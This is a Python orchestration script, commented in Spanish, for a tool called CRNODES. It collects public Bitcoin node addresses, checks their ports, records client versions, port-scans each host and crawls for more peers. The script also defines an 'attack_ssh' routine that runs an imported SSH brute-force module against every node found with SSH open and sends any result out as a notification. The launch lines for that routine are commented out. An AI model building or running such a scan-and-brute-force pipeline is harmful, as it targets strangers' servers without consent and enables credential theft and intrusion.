import logging
import multiprocessing
import json
from database import database
from extdata import getdata
from tools import procdata, ssh_bruteforce
from network import network
import time
import datetime
## Configuramos el formato de log
logging.basicConfig(filename='crnodes.log',format="%(asctime)s | %(levelname)s | %(message)s", level=logging.INFO)

## Función de primer lanzamiento, crea BBDD y la rellena con los datos de bitnodes
def first_run():
    logging.warning("La BBDD no existe")
    logging.info("Se creará la BBDD")
    database.create_database()
    logging.info("Base de datos creada correctamente")
    ## Cargamos los datos desde external data source (bitnodes)
    logging.info("Realizando primera carga en la BBDD")
    for address, port in getdata.bitnode_dict().items():
        address_type = procdata.check_ip_address_type(address)
        if address_type == "IPv4":
            if network.check_port(address, int(port)):
                logging.info("Detectado nodo con puerto abierto: "+address+":"+port)
                database.insert_new_node(address, address_type, port)
    
## tenemos datos en la bbdd, son equipos que aceptan conexiones entrantes.
                
## Función de limpieza
def cleaner():
    while True:
        node_list = database.all_nodes()
        logging.info("| CLEANER | ONLINE SCORE|")
        database.delete_0_score_nodes()
        for address, address_type, bitcoin_port, user_agent, online_score in node_list:
            logging.info("| CLEANER | Comprobando "+address+" online score="+str(online_score) )
            if address_type == "IPv4":
                if network.check_port_ipv4(address, int(bitcoin_port)):
                    online_score = online_score +1
                    logging.info("| CLEANER | "+address + " continua online ponemos score a "+str(online_score))
                    database.update_online_score(address, online_score)
                else:
                    online_score = online_score -1
                    logging.info("| CLEANER | Nodo apagado o fuera de cobertura pasa un score de "+str(online_score))
                    database.update_online_score(address, online_score)
            elif address_type == "IPv6":
                if network.check_port_ipv6(address, int(bitcoin_port)):
                    online_score = online_score +1
                    logging.info("| CLEANER | "+address + " continua online ponemos score a "+str(online_score))
                    database.update_online_score(address, online_score)
                else:
                    online_score = online_score -1
                    logging.info("| CLEANER | Nodo apagado o fuera de cobertura pasa un score de "+str(online_score))
                    database.update_online_score(address, online_score)
        node_list = database.non_listening_nodes_date()
        logging.info("| CLEANER | LAST SEEN |")
        for address, last_seen in node_list:
            now = datetime.datetime.now()
            try:
                last_seen = datetime.datetime.strptime(last_seen, '%d/%m/%Y %H:%M:%S')
                if((now-last_seen).days) >=5:
                    database.delete_non_listening_node(address)
            except Exception:
                pass
        logging.info("| CLEANER | NO AGENT |")
        try:
            database.delete_no_agent_node()
        except Exception:
            pass
            
        ## lanzamos el limpiador cada hora
        time.sleep(3600)

## completamos la versión del cliente Bitcoin 
def complete_user_agent():
    while True:
        node_list =database.no_user_agent()
        for address, address_type, bitcoin_port in node_list:
            logging.info("| USER_AGENT | Detectando version nodo Bitcoin en "+address)
            user_agent = network.get_node_version(address, address_type, bitcoin_port)
            if user_agent == 'Error':
                logging.warning("| USER_AGENT | No se pudo detectar version nodo Bitcoin en "+address)
                database.add_user_agent(address, 'IBD')
                pass
            else:
                logging.info("| USER_AGENT | Detectado "+user_agent+ " en "+ address)
                database.add_user_agent(address, user_agent)

## escaneo puertos 
def port_scan():
    while True:
        node_list = database.no_scan_date()
        for address, address_type in node_list:
            logging.info("| PORT SCAN | Detectando puertos abiertos en "+address)
            open_port_list = network.scan_open_ports(address, address_type)
            if len(open_port_list)>1 and len(open_port_list)<50:
                logging.info("| PORT SCAN | Puertos abiertos en "+address)
                database.add_open_ports(address, json.dumps(open_port_list))
                logging.info("| PORT SCAN | Puertos"+json.dumps(open_port_list)+ " añadidos a "+address)
            elif len(open_port_list)>50:
                database.add_open_ports(address, "ALL OPEN")
            else:
                logging.info("| PORT SCAN | No se han detectado puertos en "+address)
                database.add_open_ports(address, None)
            

def get_more_nodes():
    while True:
        node_list= database.all_nodes()
        for address, address_type, bitcoin_port, user_agent, online_score in node_list:
            logging.info("| GET NODES | Solicitando nodos a  "+address)
            for address, port in network.get_more_nodes(address, bitcoin_port).items():
                address_type = procdata.check_ip_address_type(address)
                if address_type == "IPv4":
                    logging.info("| GET NODES | Comprobando si el nodo "+ address+ " acepta conexiones")
                    if network.check_port_ipv4(address, int(port)):
                        logging.info("| GET NODES | Detectado nodo con puerto abierto: "+address+":"+port)
                        if database.insert_new_node(address, address_type, port) == "Error":
                            logging.warning("| GET NODES | Detectado nodo duplicado "+ address)
                    else:
                        logging.info("| GET NODES | El nodo "+ address+ " no acepta conexiones")
                        database.insert_or_replace_non_listening_node(address, port)
                elif address_type == "IPv6":
                    logging.info("| GET NODES | Comprobando si el nodo "+ address+ " acepta conexiones")
                    if network.check_port_ipv6(address, int(port)):
                        logging.info("| GET NODES | Detectado nodo con puerto abierto: "+address+":"+port)
                        if database.insert_new_node(address, address_type, port) == "Error":
                            logging.warning("| GET NODES | Detectado nodo duplicado "+ address)
                    else:
                        logging.info("| GET NODES | El nodo "+ address+ " no acepta conexiones")
                        database.insert_or_replace_non_listening_node(address, port)

def attack_ssh():
    while True:
        node_list = database.ssh_open_nodes()
        for node in node_list:
            logging.info("| SSH ATTACK | Comenzando ataque a "+node[0])
            try:
                result = ssh_bruteforce.is_ssh_open(node[0])
                if result != False: 
                    if result != None:
                        network.send_notification(result)
            except Exception as e:
                pass    

if __name__ == '__main__':
    logging.info('Arranque script CRNODES')
    first_run_job = multiprocessing.Process(
        name='first_run',
        target=first_run
    )
    cleaner_job = multiprocessing.Process(
        name='cleaner',
        target=cleaner,
    )
    user_agent_job = multiprocessing.Process(
        name='user_agent',
        target=complete_user_agent
    )
    port_scan_job = multiprocessing.Process(
        name='port_scan',
        target=port_scan
    )
    get_more_nodes_job = multiprocessing.Process(
        name='get_more_nodes',
        target=get_more_nodes
    )
    ssh_bruteforce_job = multiprocessing.Process(
        name='ssh_bruteforce',
        target=attack_ssh
    )
    if database.check_database_exist():
        pass
    else:
        first_run_job.start()
        logging.info("Primer arranque detectado")
        time.sleep(60)
    cleaner_job.start()
    logging.info("Proceso cleaner iniciado")
    user_agent_job.start()
    logging.info("Proceso user agent iniciado")
    port_scan_job.start()
    logging.info("Proceso scaner puertos iniciado")
    get_more_nodes_job.start()
    logging.info("Proceso detectar más nodos iniciado")
    #ssh_bruteforce_job.start()
    #logging.info("Proceso ataque ssh iniciado")